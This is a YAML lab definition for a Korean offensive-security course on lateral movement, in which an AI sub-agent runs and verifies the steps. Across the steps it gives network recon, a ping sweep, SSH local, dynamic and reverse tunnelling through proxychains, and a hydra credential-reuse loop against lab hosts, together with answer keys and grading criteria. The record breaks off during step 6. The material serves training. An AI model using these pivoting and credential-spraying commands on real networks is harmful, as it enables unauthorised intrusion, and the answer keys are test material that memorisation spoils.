lab_id: attack-adv-ai-week08
title: 측면 이동 (Lateral Movement) (AI 지원)
version: ai
course: attack-adv-ai
week: 8
description: 내부 네트워크에서 초기 거점으로부터 다른 시스템으로 이동하는 측면 이동 기법을 실습한다. SSH 피봇팅, 포트 포워딩, 프록시 체이닝 등을 통해 네트워크 세그먼트를 횡단한다. AI SubAgent가 자동으로 명령을 실행하고 
  결과를 검증합니다.
difficulty: hard
duration_minutes: 120
objectives:
- SSH 피봇팅과 다중 포트 포워딩을 구성한다
- proxychains를 활용한 다단계 네트워크 접근을 수행한다
- 내부 서비스 발견과 자격증명 재사용 공격을 실행한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: 초기 거점에서 내부 네트워크를 탐색하라. arp 테이블과 네트워크 인터페이스를 확인하여 도달 가능한 네트워크를 식별하라.
  hint: ip addr, ip route, arp -a 명령으로 네트워크 정보를 수집한다
  category: recon
  points: 10
  answer: '🤖 프롬프트: 초기 거점에서 내부 네트워크를 탐색하라. arp 테이블과 네트워크 인터페이스를 확인하여 도달 가능한 네트워크를 식별해줘

    📎 참고 (CLI): ip addr show && echo ''---'' && ip route show && echo ''---'' && arp -a 2>/dev/null || ip neigh show && echo ''---'' && cat /etc/resolv.conf'
  answer_detail: 측면 이동의 첫 단계는 현재 호스트의 네트워크 위치를 파악하는 것이다. 다중 NIC, 라우팅 테이블, ARP 캐시에서 인접 네트워크와 호스트를 식별한다. /etc/resolv.conf의 DNS 서버 주소는 도메인 
    컨트롤러를 가리키는 경우가 많다.
  verify:
    type: output_contains
    expect: 10.20.30
    field: stdout
    semantic:
      intent: 초기 거점에서 내부 네트워크 토폴로지 파악 — IP/route/arp/DNS 설정으로 도달 가능한 네트워크·인접 호스트 식별
      success_criteria:
      - ip addr 또는 ifconfig 실행으로 NIC 정보 노출
      - ip route 또는 netstat -rn 로 라우팅 테이블 확인
      - arp -a 또는 ip neigh show 로 ARP 캐시 내 인접 호스트 식별
      - DNS 서버(/etc/resolv.conf) 확인으로 도메인 컨트롤러 힌트 획득
      acceptable_methods:
      - ip addr + ip route + ip neigh + cat /etc/resolv.conf 체인
      - ifconfig + route + arp (구식 도구)
      - Windows 의 ipconfig /all + route print + arp -a 동등 명령
      - netstat -anop 로 활성 연결과 경유점 병행
      negative_signs:
      - 명령 1 개만 실행 (토폴로지 부분 정보)
      - localhost 만 확인
      - 결과 해석 없이 단순 명령 나열
  target_vm: attacker
  script: ip addr show && echo '---' && ip route show && echo '---' && arp -a 2>/dev/null || ip neigh show && echo '---' && cat 
    /etc/resolv.conf
  risk_level: low
  bastion_prompt: 초기 거점에서 내부 네트워크를 탐색하라. arp 테이블과 네트워크 인터페이스를 확인하여 도달 가능한 네트워크를 식별해줘
- order: 2
  instruction: ping 스위프를 수행하여 10.20.30.0/24 대역의 활성 호스트를 탐지하라. for 루프를 사용하여 빠르게 스캔하라.
  hint: ping -c 1 -W 1 옵션으로 1초 타임아웃으로 빠르게 스캔한다
  category: recon
  points: 10
  answer: '🤖 프롬프트: ping 스위프를 수행하여 10.20.30.0/24 대역의 활성 호스트를 탐지하라. for 루프를 사용하여 빠르게 스캔해줘

    📎 참고 (CLI): for i in $(seq 1 254); do (ping -c 1 -W 1 10.20.30.$i &>/dev/null && echo "10.20.30.$i alive") & done; wait 2>/dev/null; echo
    ''Sweep complete'''
  answer_detail: ping 스위프는 ICMP를 사용한 빠른 호스트 탐지 방법이다. 백그라운드 병렬 실행(&)으로 속도를 높이고, -W 1로 타임아웃을 설정한다. ICMP가 차단된 환경에서는 TCP 포트 스캔(nmap -sn 
    -PS22,80,445)이나 ARP 스캔(arp-scan)을 대안으로 사용한다.
  verify:
    type: output_contains
    expect: alive
    field: stdout
    semantic:
      intent: 10.20.30.0/24 대역 ping 스위프 — for 루프로 병렬 ping 실행해 활성 호스트 탐지
      success_criteria:
      - for 루프 또는 xargs 로 254 개 IP 순회
      - -c 1 -W 1 등 타임아웃 옵션 사용
      - alive/active 호스트 출력 목록
      acceptable_methods:
      - bash for + ping & (병렬)
      - nmap -sn -PE 10.20.30.0/24
      - fping -a -g 10.20.30.0/24
      - arp-scan 또는 masscan --ping
      negative_signs:
      - 단일 호스트만 ping
      - 타임아웃 없어 순차 수백 초
      - alive 호스트 식별 없이 raw ping 출력만
  target_vm: attacker
  script: for i in $(seq 1 254); do (ping -c 1 -W 1 10.20.30.$i &>/dev/null && echo "10.20.30.$i alive") & done; wait 2>/dev/null; echo 
    'Sweep complete'
  risk_level: low
  bastion_prompt: ping 스위프를 수행하여 10.20.30.0/24 대역의 활성 호스트를 탐지하라. for 루프를 사용하여 빠르게 스캔해줘
- order: 3
  instruction: SSH 로컬 포트 포워딩으로 피봇팅을 구성하라. {{WEB_IP}}을 통해 {{SECU_IP}}00:443(Wazuh)에 접근하는 명령을 구성하라.
  hint: ssh -L 로컬포트:원격:원격포트 사용자@피봇호스트 형태이다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: SSH 로컬 포트 포워딩으로 피봇팅을 구성하라. 10.20.30.80을 통해 10.20.30.100:443(Wazuh)에 접근하는 명령을 구성해줘

    📎 참고 (CLI): echo ''=== SSH Local Port Forwarding ==='' && echo ''ssh -L 9443:10.20.30.100:443 ccc@10.20.30.80 -N -f'' && echo '''' && echo
    ''Access Wazuh via: https://localhost:9443'' && echo '''' && echo ''Multiple forwards:'' && echo ''ssh -L 9443:10.20.30.100:443 -L 9022:10.20.30.1:22
    -L 9080:10.20.30.100:5601 ccc@10.20.30.80 -N -f'' && echo '''' && echo ''Current SSH config:'' && cat ~/.ssh/config 2>/dev/null | head -10
    || echo ''No SSH config found'''
  answer_detail: SSH 로컬 포트 포워딩(-L)은 공격자 머신의 로컬 포트를 SSH 터널을 통해 원격 호스트의 서비스에 연결한다. 다중 -L 옵션으로 여러 서비스를 동시에 포워딩할 수 있다. -N은 셸 미실행, -f는 백그라운드 
    실행이다. 이를 통해 방화벽으로 분리된 네트워크 세그먼트에 접근한다.
  verify:
    type: output_contains
    expect: SSH Local Port Forwarding
    field: stdout
    semantic:
      intent: SSH 로컬 포트 포워딩 — 피봇 호스트 경유로 내부 서비스(Wazuh:443) 에 접근하는 ssh -L 구성
      success_criteria:
      - ssh -L <local>:<target>:<port> user@pivot 형태 명령 제시
      - 다중 -L 로 여러 서비스 동시 포워딩 예시 포함
      - -N -f 옵션 의미(셸 미실행, 백그라운드) 설명
      acceptable_methods:
      - ssh -L ... -N -f 직접 실행 또는 명령 출력
      - ~/.ssh/config 의 LocalForward 엔트리 예
      - PuTTY 의 Tunnels 설정 설명
      - autossh 로 자동 재연결 터널
      negative_signs:
      - ssh 접속만 설명 (-L 없음)
      - 포워딩 포트 한 개만, 다중 예시 없음
      - -R(리버스) 와 혼동
  target_vm: attacker
  script: 'echo ''=== SSH Local Port Forwarding ==='' && echo ''ssh -L 9443:10.20.30.100:443 ccc@10.20.30.80 -N -f'' && echo '''' && echo ''Access
    Wazuh via: https://localhost:9443'' && echo '''' && echo ''Multiple forwards:'' && echo ''ssh -L 9443:10.20.30.100:443 -L 9022:10.20.30.1:22
    -L 9080:10.20.30.100:5601 ccc@10.20.30.80 -N -f'' && echo '''' && echo ''Current SSH config:'' && cat ~/.ssh/config 2>/dev/null | head -10
    || echo ''No SSH config found'''
  risk_level: medium
  bastion_prompt: SSH 로컬 포트 포워딩으로 피봇팅을 구성하라. 10.20.30.80을 통해 10.20.30.100:443(Wazuh)에 접근하는 명령을 구성해줘
- order: 4
  instruction: SSH 동적 포트 포워딩(SOCKS 프록시)을 구성하고, proxychains로 도구를 라우팅하는 방법을 보여라.
  hint: ssh -D로 SOCKS 프록시를 생성하고, proxychains.conf를 설정한다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: SSH 동적 포트 포워딩(SOCKS 프록시)을 구성하고, proxychains로 도구를 라우팅하는 방법을 보여라해줘

    📎 참고 (CLI): echo ''=== SSH Dynamic Port Forwarding + Proxychains ==='' && echo ''1. Create SOCKS proxy: ssh -D 1080 ccc@10.20.30.80 -N -f''
    && echo '''' && echo ''2. Configure proxychains:'' && echo ''echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf'' && echo '''' && echo
    ''3. Route tools through proxy:'' && echo ''proxychains nmap -sT -p 22,80,443 10.20.30.100'' && echo ''proxychains curl http://10.20.30.100:5601''
    && echo ''proxychains ssh ccc@10.20.30.1'' && echo '''' && cat /etc/proxychains4.conf 2>/dev/null | tail -5 || echo ''proxychains config not
    found'''
  answer_detail: SSH 동적 포워딩(-D)은 SOCKS5 프록시를 생성하여 모든 TCP 트래픽을 터널로 라우팅한다. proxychains는 임의의 프로그램을 SOCKS 프록시를 통해 실행하는 래퍼이다. nmap, curl, ssh 등 
    대부분의 TCP 도구를 피봇 호스트를 통해 내부 네트워크에서 실행할 수 있다.
  verify:
    type: output_contains
    expect: Proxychains
    field: stdout
    semantic:
      intent: SSH 동적 포트 포워딩(-D) + proxychains — SOCKS5 프록시 생성해 모든 TCP 도구(nmap/curl/ssh) 를 피봇 경유 라우팅
      success_criteria:
      - ssh -D <port> user@pivot -N -f 명령으로 SOCKS 프록시 생성
      - /etc/proxychains4.conf (또는 proxychains.conf) 에 socks5 127.0.0.1 <port> 설정
      - proxychains nmap/curl/ssh 실제 도구 사용 예시
      acceptable_methods:
      - ssh -D + proxychains 조합
      - ssh -D + proxytunnel / tsocks / torsocks
      - Windows 의 Proxifier 설정
      - python socks 라이브러리로 직접 SOCKS 사용
      negative_signs:
      - -L (로컬 포워딩) 만 사용
      - SOCKS 프록시 구성 없이 단순 ssh
      - proxychains 설정 파일 언급 없음
  target_vm: attacker
  script: 'echo ''=== SSH Dynamic Port Forwarding + Proxychains ==='' && echo ''1. Create SOCKS proxy: ssh -D 1080 ccc@10.20.30.80 -N -f'' &&
    echo '''' && echo ''2. Configure proxychains:'' && echo ''echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf'' && echo '''' && echo ''3.
    Route tools through proxy:'' && echo ''proxychains nmap -sT -p 22,80,443 10.20.30.100'' && echo ''proxychains curl http://10.20.30.100:5601''
    && echo ''proxychains ssh ccc@10.20.30.1'' && echo '''' && cat /etc/proxychains4.conf 2>/dev/null | tail -5 || echo ''proxychains config not
    found'''
  risk_level: medium
  bastion_prompt: SSH 동적 포트 포워딩(SOCKS 프록시)을 구성하고, proxychains로 도구를 라우팅하는 방법을 보여라해줘
- order: 5
  instruction: SSH 리버스 포트 포워딩(-R)을 구성하라. 내부 호스트에서 외부로 나가는 터널을 통해 서비스를 노출하는 시나리오를 설명하라.
  hint: ssh -R 원격포트:로컬:로컬포트 형태로 리버스 터널을 구성한다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: SSH 리버스 포트 포워딩(-R)을 구성해줘

    📎 참고 (CLI): echo ''=== SSH Reverse Port Forwarding ==='' && echo ''Scenario: Internal host has outbound SSH but no inbound'' && echo ''''
    && echo ''On internal host (10.20.30.100):'' && echo ''ssh -R 9100:127.0.0.1:5601 ccc@10.20.30.201 -N -f'' && echo '''' && echo ''Result:
    attacker can access Wazuh at localhost:9100'' && echo '''' && echo ''Reverse SOCKS (pivot from inside):'' && echo ''ssh -R 1080 ccc@10.20.30.201
    -N -f'' && echo ''-> Creates SOCKS proxy on attacker machine'' && echo ''-> Routes traffic through internal host'''
  answer_detail: SSH 리버스 포워딩(-R)은 내부 호스트에서 외부로 터널을 생성한다. 방화벽이 인바운드를 차단하지만 아웃바운드 SSH를 허용하는 경우에 유용하다. 리버스 SOCKS(-R 1080)는 내부 네트워크 전체를 피봇할 수 있어
    매우 강력하다. chisel, ligolo 등의 도구도 같은 원리로 동작한다.
  verify:
    type: output_contains
    expect: Reverse Port Forwarding
    field: stdout
    semantic:
      intent: SSH 리버스 포트 포워딩(-R) — 내부 호스트에서 아웃바운드 SSH 터널로 서비스를 공격자 머신에 노출
      success_criteria:
      - ssh -R <remote_port>:<internal>:<port> user@attacker -N -f 명령 제시
      - 방화벽 인바운드 차단 / 아웃바운드 SSH 허용 시나리오 설명
      - Reverse SOCKS (-R 1080) 로 내부 네트워크 전체 피봇팅 가능성 언급
      acceptable_methods:
      - ssh -R 로 단일 서비스 노출
      - ssh -R 1080 + autossh 로 영속적 리버스 SOCKS
      - chisel client/ligolo-ng 로 동등 리버스 터널
      - cron 또는 systemd 로 리버스 터널 부팅 시 자동 연결
      negative_signs:
      - ssh -L(로컬) 만 설명
      - 방화벽 시나리오 맥락 없음
      - 리버스 터널 완료 후 접근 방법 누락
  target_vm: attacker
  script: 'echo ''=== SSH Reverse Port Forwarding ==='' && echo ''Scenario: Internal host has outbound SSH but no inbound'' && echo '''' && echo
    ''On internal host (10.20.30.100):'' && echo ''ssh -R 9100:127.0.0.1:5601 ccc@10.20.30.201 -N -f'' && echo '''' && echo ''Result: attacker
    can access Wazuh at localhost:9100'' && echo '''' && echo ''Reverse SOCKS (pivot from inside):'' && echo ''ssh -R 1080 ccc@10.20.30.201 -N
    -f'' && echo ''-> Creates SOCKS proxy on attacker machine'' && echo ''-> Routes traffic through internal host'''
  risk_level: medium
  bastion_prompt: SSH 리버스 포트 포워딩(-R)을 구성해줘
- order: 6
  instruction: 자격증명 재사용(Credential Reuse) 공격을 시뮬레이션하라. 한 호스트에서 획득한 자격증명으로 다른 호스트에 접근을 시도하라.
  hint: 동일 비밀번호가 여러 시스템에서 사용되는지 hydra로 테스트한다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: 자격증명 재사용(Credential Reuse) 공격을 시뮬레이션해줘

    📎 참고 (CLI): echo ''=== Credential Reuse Attack ==='' && echo -e ''10.20.30.1\n10.20.30.80\n10.20.30.100'' > /tmp/targets.txt && echo ''admin''
    > /tmp/cred_user.txt && echo ''admin123'' > /tmp/cred_pass.txt && echo '''' && echo ''Testing credentials across network:'' && for target
    in 10.20.30.1 10.20.30.80 10.20.30.100; do echo "Target: $target"; hydra -l admin -p admin123 ssh://$target -t 2 -V 2>&1 | tail -3; echo ''---'';
    done'
  answer_detail: 자격증명 재사용은 측면 이동에서 가장 흔한 기법이다. 관리자가 여러 시스템에 동일한 비밀번호를 사용하면, 하나의 시스템에서 자격증명을 탈취하면 전체 네트워크로 확산된다. 이를 방지하려면 LAPS(Local 
    Administrator Password Solution), 비밀번호 볼트, 고유 비밀번호 정책을 적용해야 한다.
  verify:
    type: output_contains
    expect: Credential Reuse
    field: stdout
    semantic:
      intent: 자격증명 재사용(Credential Reuse) 공격 — 한 호스트에서 획득한 admin:password 를 네트워크 내 다른 호스트들에 순회 시도
